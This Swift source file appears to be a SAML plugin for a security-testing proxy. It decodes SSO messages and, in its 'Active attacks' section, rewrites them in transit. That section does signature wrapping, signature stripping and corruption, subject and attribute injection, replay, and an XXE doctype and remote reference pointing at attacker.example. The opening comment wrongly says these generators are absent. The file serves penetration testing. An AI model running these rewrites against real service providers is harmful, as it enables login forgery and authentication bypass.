// WebScarab (Swift) - plugin.saml: finds SAML single-sign-on messages passing through the proxy,
// decodes them and reports what they contain and which protections they carry.
//
// This is the review side of the original plugin: it decodes and analyses messages so you can
// inspect a SAML exchange. The original's active signature-tampering and message-forgery
// generators are not included.

import Foundation

public struct SamlAnalysis: Sendable, Identifiable {
    public var id: Int { conversation }
    public enum Kind: String, Sendable { case request = "Request", response = "Response" }
    public var conversation: Int
    public var kind: Kind
    public var url: URL
    public var encoded: String
    public var xml: String
    public var prettyXML: String
    public var version: String                 // "SAML 2.0", "SAML 1.1" or "Unknown"
    public var relayState: String?
    public var attributes: [NamedValue]
    public var hasDestinationIndication: Bool  // anti-replay: Destination / Recipient / Audience present
    public var hasValidityInterval: Bool       // Conditions NotBefore + NotOnOrAfter present
    public var hasProtocolSignature: Bool
    public var hasAssertionSignature: Bool
    public var hasEncryptedAttributes: Bool
    public var issuer: String?
    public var subject: String?
    public var destinations: [String]
    public var notBefore: String?
    public var notOnOrAfter: String?
}

public enum SamlDecoder {
    static let protocol2 = "urn:oasis:names:tc:SAML:2.0:protocol"
    static let protocol1 = "urn:oasis:names:tc:SAML:1.0:protocol"
    static let signatureNS = "http://www.w3.org/2000/09/xmldsig#"

    /// SAML POST binding carries Base64 XML; the redirect (GET) binding adds raw DEFLATE.
    public static func decode(_ value: String) -> String? {
        let unescaped = Encoding.urlDecode(value)
        guard let data = Encoding.base64Decode(unescaped) else { return nil }
        if let text = asXML(data) { return text }
        if let inflated = HTTPMessageCoding.inflate(data, zlibWrapped: false), let text = asXML(inflated) { return text }
        return asXML(data) ?? String(data: data, encoding: .utf8)
    }

    static func asXML(_ data: Data) -> String? {
        guard let text = String(data: data, encoding: .utf8) ?? String(data: data, encoding: .isoLatin1) else { return nil }
        return text.trimmingCharacters(in: .whitespacesAndNewlines).hasPrefix("<") ? text : nil
    }

    /// Elements anywhere in the tree with this local name (namespace-agnostic).
    static func elements(_ document: XMLDocument, _ localName: String) -> [XMLElement] {
        ((try? document.nodes(forXPath: "//*[local-name()='\(localName)']")) ?? []).compactMap { $0 as? XMLElement }
    }

    static func firstText(_ element: XMLElement?) -> String? {
        guard let element else { return nil }
        let text = element.stringValue?.trimmingCharacters(in: .whitespacesAndNewlines)
        return (text?.isEmpty ?? true) ? nil : text
    }

    public static func analyse(conversation: Conversation, kind: SamlAnalysis.Kind, encoded: String) -> SamlAnalysis? {
        guard let xml = decode(encoded) else { return nil }
        var analysis = SamlAnalysis(conversation: conversation.id, kind: kind, url: conversation.url, encoded: encoded,
                                    xml: xml, prettyXML: xml, version: "Unknown", relayState: nil, attributes: [],
                                    hasDestinationIndication: false, hasValidityInterval: false, hasProtocolSignature: false,
                                    hasAssertionSignature: false, hasEncryptedAttributes: false, issuer: nil, subject: nil,
                                    destinations: [], notBefore: nil, notOnOrAfter: nil)
        if xml.contains(protocol2) { analysis.version = "SAML 2.0" }
        else if xml.contains(protocol1) { analysis.version = "SAML 1.1" }

        guard let document = try? XMLDocument(xmlString: xml, options: [.nodePreserveWhitespace]) else { return analysis }
        analysis.prettyXML = document.xmlString(options: [.nodePrettyPrint])

        // Attributes: SAML 2.0 uses Name, SAML 1.1 uses AttributeName.
        for attribute in elements(document, "Attribute") {
            let name = attribute.attribute(forName: "Name")?.stringValue ?? attribute.attribute(forName: "AttributeName")?.stringValue
            let value = firstText(elements(document, "AttributeValue").first {
                $0.parent === attribute
            }) ?? attribute.elements(forName: "AttributeValue").first?.stringValue
            if let name { analysis.attributes.append(NamedValue(name: name, value: value ?? "")) }
        }
        analysis.hasEncryptedAttributes = !elements(document, "EncryptedAttribute").isEmpty

        analysis.issuer = firstText(elements(document, "Issuer").first)
        analysis.subject = firstText(elements(document, "NameID").first) ?? firstText(elements(document, "NameIdentifier").first)

        // Destination indication (anti-replay): Destination/Recipient/Address attributes or an Audience element.
        var destinations: [String] = []
        for element in [elements(document, "Response"), elements(document, "AuthnRequest"), elements(document, "SubjectConfirmationData")].flatMap({ $0 }) {
            for attributeName in ["Destination", "Recipient", "Address"] {
                if let value = element.attribute(forName: attributeName)?.stringValue { destinations.append("\(attributeName): \(value)") }
            }
        }
        for audience in elements(document, "Audience") { if let text = firstText(audience) { destinations.append("Audience: \(text)") } }
        analysis.destinations = destinations
        analysis.hasDestinationIndication = !destinations.isEmpty

        // Validity interval: Conditions with both NotBefore and NotOnOrAfter.
        for conditions in elements(document, "Conditions") {
            if let notBefore = conditions.attribute(forName: "NotBefore")?.stringValue,
               let notOnOrAfter = conditions.attribute(forName: "NotOnOrAfter")?.stringValue {
                analysis.hasValidityInterval = true
                analysis.notBefore = notBefore
                analysis.notOnOrAfter = notOnOrAfter
            }
        }

        // Signatures: a Signature whose parent is an Assertion protects the assertion; otherwise it's the protocol signature.
        for signature in elements(document, "Signature") {
            let parentName = (signature.parent as? XMLElement)?.localName
            if parentName == "Assertion" { analysis.hasAssertionSignature = true } else { analysis.hasProtocolSignature = true }
        }
        return analysis
    }
}

// MARK: - Active attacks (plugin.saml.SamlHTTPClient / SamlProxy)
//
// These rewrite a SAML message as it passes through the proxy, to test whether the service
// provider correctly validates it. They are the message-tampering tests a SAML penetration test
// relies on (signature wrapping, signature stripping, assertion/subject injection), applied only
// to traffic the tester is already routing through this proxy.

public enum SamlOccurrence: String, Codable, CaseIterable, Sendable, Identifiable {
    case all = "All", first = "First", last = "Last"
    public var id: String { rawValue }
}

public enum SamlWrapper: String, Codable, CaseIterable, Sendable, Identifiable {
    case dsObject = "ds:Object", samlpExtensions = "samlp:Extensions", assertion = "Duplicated Assertion"
    public var id: String { rawValue }
}

public enum SamlSignatureTarget: String, Codable, CaseIterable, Sendable, Identifiable {
    case protocolSignature = "Protocol", assertionSignature = "Assertion"
    public var id: String { rawValue }
}

public struct SamlAttackConfig: Codable, Sendable, Equatable {
    public var removeProtocolSignature = false
    public var removeAssertionSignature = false
    public var corruptSignature = false
    public var injectRemoteReference = false
    public var remoteReference = "http://attacker.example/evil"
    public var injectAttribute = false
    public var injectionAttributes: [SamlNamedValue] = []
    public var injectSubject = false
    public var subject = ""
    public var subjectOccurrence = SamlOccurrence.all
    public var injectPublicDoctype = false       // XXE probe
    public var dtdUri = "http://attacker.example/evil.dtd"
    public var injectRelayState = false
    public var relayState = ""
    public var signatureWrapping = false
    public var wrapper = SamlWrapper.assertion
    public var wrapperTarget = SamlSignatureTarget.protocolSignature
    public var renameTopId = false
    public var renameAssertionId = false
    public var renameLastAssertionId = false
    public var replay = false
    public var replayMessage: String?            // a captured SAMLResponse to resend

    public var isActive: Bool {
        removeProtocolSignature || removeAssertionSignature || corruptSignature || injectRemoteReference
            || injectAttribute || injectSubject || injectPublicDoctype || injectRelayState
            || signatureWrapping || replay
    }
}

public struct SamlNamedValue: Codable, Sendable, Equatable, Identifiable, Hashable {
    public var id = UUID()
    public var name = ""
    public var value = ""
}

public enum SamlAttacks {
    static let dsig = "http://www.w3.org/2000/09/xmldsig#"

    /// Rewrites a form-urlencoded POST body that carries a SAML message. Returns the new body,
    /// and the list of attacks actually applied (for the X-SAMLProxy marker header).
    public static func apply(_ config: SamlAttackConfig, toFormBody body: Data) -> (Data, [String])? {
        var pairs = NamedValue.split(String(decoding: body, as: UTF8.self), "&", "=")
        guard pairs.contains(where: { $0.name == "SAMLResponse" || $0.name == "RelayState" }) else { return nil }
        var applied: [String] = []
        var touchedSaml = false
        for index in pairs.indices {
            if pairs[index].name == "RelayState", config.injectRelayState {
                pairs[index].value = Encoding.urlEncode(config.relayState)
                applied.append("injected relay state")
            }
            guard pairs[index].name == "SAMLResponse" else { continue }
            touchedSaml = true
            guard var xml = SamlDecoder.decode(pairs[index].value) else { continue }

            if config.replay, let message = config.replayMessage, let replayed = SamlDecoder.decode(message) {
                xml = replayed
                applied.append("replayed")
            }
            if config.signatureWrapping, let result = signatureWrapping(xml, config) { xml = result; applied.append("signature wrapping") }
            if config.injectAttribute, let result = injectAttributes(xml, config.injectionAttributes) { xml = result; applied.append("injected attribute") }
            if config.injectSubject, let result = injectSubject(xml, config.subject, config.subjectOccurrence) { xml = result; applied.append("injected subject") }
            if config.injectPublicDoctype {
                xml = "<!DOCTYPE SomeElement SYSTEM \"\(config.dtdUri)\">" + xml
                applied.append("injected public doctype")
            }
            if config.removeAssertionSignature, let result = removeSignatures(xml, assertionOnly: true) { xml = result; applied.append("removed assertion signature") }
            if config.removeProtocolSignature, let result = removeSignatures(xml, assertionOnly: false) { xml = result; applied.append("removed signature") }
            else {
                if config.corruptSignature, let result = corruptSignature(xml) { xml = result; applied.append("corrupted signature") }
                if config.injectRemoteReference, let result = injectRemoteReference(xml, config.remoteReference) { xml = result; applied.append("injected remote reference") }
            }
            pairs[index].value = encode(xml)
        }
        guard touchedSaml || applied.contains("injected relay state") else { return nil }
        let newBody = pairs.map { "\($0.name)=\($0.value)" }.joined(separator: "&")
        return (Data(newBody.utf8), applied)
    }

    static func encode(_ xml: String) -> String {
        Encoding.urlEncode(Encoding.base64Encode(Data(xml.utf8)))
    }

    static func document(_ xml: String) -> XMLDocument? {
        try? XMLDocument(xmlString: xml, options: [.nodePreserveWhitespace, .nodePreserveNamespaceOrder])
    }

    static func output(_ document: XMLDocument) -> String {
        String(decoding: document.xmlData(options: []), as: UTF8.self)
    }

    static func protocolSignature(_ document: XMLDocument) -> XMLElement? {
        guard let root = document.rootElement() else { return nil }
        return root.children?.compactMap { $0 as? XMLElement }.first { $0.localName == "Signature" && $0.uri == dsig }
    }

    static func assertionSignatures(_ document: XMLDocument) -> [XMLElement] {
        SamlDecoder.elements(document, "Signature").filter { ($0.parent as? XMLElement)?.localName == "Assertion" }
    }

    static func corruptSignature(_ xml: String) -> String? {
        guard let document = document(xml), let signature = protocolSignature(document) else { return nil }
        // Flip a character of the SignatureValue so verification fails.
        for node in (try? signature.nodes(forXPath: ".//*[local-name()='SignatureValue']")) ?? [] {
            guard let element = node as? XMLElement, let value = element.stringValue, let first = value.first else { continue }
            let replacement: Character = first == "A" ? "B" : "A"
            element.stringValue = String(replacement) + value.dropFirst()
            return output(document)
        }
        return nil
    }

    static func removeSignatures(_ xml: String, assertionOnly: Bool) -> String? {
        guard let document = document(xml) else { return nil }
        let targets = assertionOnly ? assertionSignatures(document) : protocolSignature(document).map { [$0] } ?? []
        guard !targets.isEmpty else { return nil }
        for signature in targets { signature.detach() }
        return output(document)
    }

    static func injectRemoteReference(_ xml: String, _ uri: String) -> String? {
        guard let document = document(xml), let signature = protocolSignature(document),
              let signedInfo = ((try? signature.nodes(forXPath: ".//*[local-name()='SignedInfo']")) ?? []).first as? XMLElement else { return nil }
        let prefix = signature.prefix.map { $0 + ":" } ?? ""
        let reference = XMLElement(name: prefix + "Reference", uri: dsig)
        reference.addAttribute(attribute("URI", uri))
        let digestMethod = XMLElement(name: prefix + "DigestMethod", uri: dsig)
        digestMethod.addAttribute(attribute("Algorithm", dsig + "sha1"))
        reference.addChild(digestMethod)
        let digestValue = XMLElement(name: prefix + "DigestValue", uri: dsig)
        digestValue.stringValue = "12345678"
        reference.addChild(digestValue)
        signedInfo.addChild(reference)
        return output(document)
    }

    static func injectAttributes(_ xml: String, _ attributes: [SamlNamedValue]) -> String? {
        guard let document = document(xml), !attributes.isEmpty else { return nil }
        for attribute in attributes where !attribute.name.isEmpty { setAttribute(document, attribute.name, attribute.value) }
        return output(document)
    }

    static func setAttribute(_ document: XMLDocument, _ name: String, _ value: String) {
        let attributeElements = SamlDecoder.elements(document, "Attribute")
        var lastStatement: XMLElement?
        for element in attributeElements {
            let elementName = element.attribute(forName: "Name")?.stringValue ?? element.attribute(forName: "AttributeName")?.stringValue
            lastStatement = element.parent as? XMLElement
            if elementName == name {
                if let valueElement = ((try? element.nodes(forXPath: "./*[local-name()='AttributeValue']")) ?? []).first as? XMLElement {
                    valueElement.stringValue = value
                    return
                }
            }
        }
        // Not present: append a new SAML 2.0 Attribute to the last AttributeStatement.
        guard let statement = lastStatement else { return }
        let prefix = attributeElements.first?.prefix.map { $0 + ":" } ?? ""
        let uri = attributeElements.first?.uri ?? "urn:oasis:names:tc:SAML:2.0:assertion"
        let attribute = XMLElement(name: prefix + "Attribute", uri: uri)
        attribute.addAttribute(self.attribute("Name", name))
        let valueElement = XMLElement(name: prefix + "AttributeValue", uri: uri)
        valueElement.stringValue = value
        attribute.addChild(valueElement)
        statement.addChild(attribute)
    }

    static func injectSubject(_ xml: String, _ subject: String, _ occurrence: SamlOccurrence) -> String? {
        guard let document = document(xml) else { return nil }
        let subjects = SamlDecoder.elements(document, "Subject")
        guard !subjects.isEmpty else { return nil }
        let indices: [Int]
        switch occurrence {
        case .all: indices = Array(subjects.indices)
        case .first: indices = [0]
        case .last: indices = [subjects.count - 1]
        }
        for index in indices {
            for localName in ["NameID", "NameIdentifier"] {
                if let nameElement = ((try? subjects[index].nodes(forXPath: ".//*[local-name()='\(localName)']")) ?? []).first as? XMLElement {
                    nameElement.stringValue = subject
                }
            }
        }
        return output(document)
    }

    static func signatureWrapping(_ xml: String, _ config: SamlAttackConfig) -> String? {
        guard let document = document(xml), let root = document.rootElement() else { return nil }
        switch config.wrapper {
        case .dsObject:
            let target = config.wrapperTarget == .assertionSignature ? assertionSignatures(document).first : protocolSignature(document)
            guard let signature = target, let signedElement = signature.parent as? XMLElement else { return nil }
            let prefix = signature.prefix.map { $0 + ":" } ?? ""
            let object = XMLElement(name: prefix + "Object", uri: dsig)
            guard let importedParent = signedElement.copy() as? XMLElement else { return nil }
            object.addChild(importedParent)
            signature.addChild(object)
            if config.renameAssertionId { renameID(signedElement) }
        case .samlpExtensions:
            let prefix = root.prefix.map { $0 + ":" } ?? ""
            let extensions = XMLElement(name: prefix + "Extensions", uri: root.uri)
            guard let importedRoot = root.copy() as? XMLElement else { return nil }
            extensions.addChild(importedRoot)
            root.addChild(extensions)
        case .assertion:
            let assertions = SamlDecoder.elements(document, "Assertion")
            guard let assertion = assertions.first, let parent = assertion.parent as? XMLElement,
                  let imported = assertion.copy() as? XMLElement else { return nil }
            parent.addChild(imported)
            if config.renameAssertionId { renameID(assertion) }
            if config.renameLastAssertionId { renameID(imported) }
        }
        if config.renameTopId { renameID(root, attributes: ["ID", "ResponseID"]) }
        return output(document)
    }

    static func renameID(_ element: XMLElement, attributes: [String] = ["ID", "AssertionID"]) {
        for name in attributes {
            if let attribute = element.attribute(forName: name), let value = attribute.stringValue {
                attribute.stringValue = "renamed-" + value
                return
            }
        }
    }

    static func attribute(_ name: String, _ value: String) -> XMLNode {
        let node = XMLNode(kind: .attribute)
        node.name = name
        node.stringValue = value
        return node
    }
}

@MainActor
public final class Saml: ObservableObject {
    @Published public private(set) var analyses: [Int: SamlAnalysis] = [:]
    @Published public private(set) var order: [Int] = []
    @Published public var attacks = SamlAttackConfig() { didSet { ProxyController.shared.samlAttacks = attacks } }
    @Published public var replaySource: Int?

    init(framework: Framework) {
        framework.addAnalyser("SAML") { [weak self] conversation in self?.analyse(conversation) }
        ProxyController.shared.samlAttacks = attacks
    }

    /// Point "replay" at a captured SAMLResponse.
    public func useForReplay(_ id: Int) {
        replaySource = id
        attacks.replayMessage = analyses[id]?.encoded
    }

    public var messages: [SamlAnalysis] { order.compactMap { analyses[$0] } }

    func analyse(_ conversation: Conversation) {
        if conversation.origin == "SAML" { return }
        // POST form binding.
        if conversation.request.method == "POST",
           (conversation.request.contentType ?? "").lowercased().hasPrefix("application/x-www-form-urlencoded") {
            scan(conversation, pairs: NamedValue.split(String(decoding: conversation.request.body, as: UTF8.self), "&", "="))
        }
        // Redirect (GET query) binding.
        if let query = conversation.request.url.query(percentEncoded: true), !query.isEmpty {
            scan(conversation, pairs: NamedValue.split(query, "&", "="))
        }
    }

    private func scan(_ conversation: Conversation, pairs: [NamedValue]) {
        let relayState = pairs.first { $0.name == "RelayState" }.map { Encoding.urlDecode($0.value) }
        for pair in pairs {
            let kind: SamlAnalysis.Kind
            switch pair.name {
            case "SAMLResponse": kind = .response
            case "SAMLRequest": kind = .request
            default: continue
            }
            guard var analysis = SamlDecoder.analyse(conversation: conversation, kind: kind, encoded: pair.value) else { continue }
            analysis.relayState = relayState
            if analyses[conversation.id] == nil { order.append(conversation.id) }
            analyses[conversation.id] = analysis
            Framework.shared.log(.info, "SAML", "\(analysis.version) \(kind.rawValue) in conversation \(conversation.id)")
        }
    }
}
